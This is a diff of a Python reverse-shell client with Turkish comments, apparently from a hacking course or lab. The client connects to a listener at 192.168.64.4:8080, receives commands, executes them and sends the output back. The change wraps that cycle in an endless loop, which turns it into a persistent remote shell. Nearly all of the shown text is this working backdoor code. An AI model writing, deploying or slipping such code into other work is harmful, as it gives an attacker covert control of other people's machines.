@@ -14,14 +14,15 @@ my_connection.connect(("192.168.64.4",8080))#ip adresini ve portu tuple olarak v
 
 my_connection.send(("Connection OK\n").encode("utf-8"))
 
-command =my_connection.recv(1024)#bağlantımdan bir veri alacağımı belirtirim 
-#içersinde kaç bytelık olacağını yazıyoruz
-#1024'ün çok üstünde veya altında almamız olumsuz sonuçlar doğurabilir
+while True:
+    command =my_connection.recv(1024)#bağlantımdan bir veri alacağımı belirtirim 
+    #içersinde kaç bytelık olacağını yazıyoruz
+    #1024'ün çok üstünde veya altında almamız olumsuz sonuçlar doğurabilir
 
-command_output = command_execution(command)
-#komutu çalıştırmak için fonksiyonumuzu cağırıyoruz
-#sonucunu bir değişkene kaydediyoruz  diğer bilgisayarımıza yollamamız gerekiyor
-my_connection.send(command_output)#karşı bilgisayara sonucu gönderdiğimiz yer
+    command_output = command_execution((command).decode("utf-8"))
+    #komutu çalıştırmak için fonksiyonumuzu cağırıyoruz
+    #sonucunu bir değişkene kaydediyoruz  diğer bilgisayarımıza yollamamız gerekiyor
+    my_connection.send(command_output)#karşı bilgisayara sonucu gönderdiğimiz yer
 
 
 
